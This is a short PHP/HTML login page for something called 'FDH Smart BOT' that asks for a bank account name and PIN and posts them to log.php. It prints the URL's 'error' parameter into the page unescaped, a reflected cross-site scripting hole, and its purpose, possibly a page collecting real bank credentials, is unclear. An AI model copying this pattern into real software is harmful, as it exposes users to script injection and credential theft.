<!DOCTYPE html>
<html>
<head>
    <title>FDH_LOGIN</title>
    <!-- Link to an external CSS stylesheet -->
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
    <h1 class="main-heading"><span style="color: black;">FDH Smart</span>BOT</h1>

    <!-- Create a form that submits data to "log.php" using the POST method -->
    <form action="log.php" method="post">
        <!-- Display a login heading -->
        <h2>LOGIN</h2>

        <!-- Check if an 'error' parameter is present in the URL query string -->
        <?php if (isset($_GET['error'])) { ?>
            <!-- Display an error message if 'error' parameter is set -->
            <p class="error"><?php echo $_GET['error']; ?></p>
        <?php } ?>

        <!-- Label and input field for entering the account name -->
        <label>Account Name</label>
        <input type="text" name="bank_username" placeholder="Bank User Name"><br>

        <!-- Label and input field for entering the PIN (password) -->
        <label>PIN</label>
        <input type="password" name="pin" placeholder="PIN"><br>

        <!-- Button to submit the form -->
        <button type="submit">Login</button>
    </form>
</body>
</html>
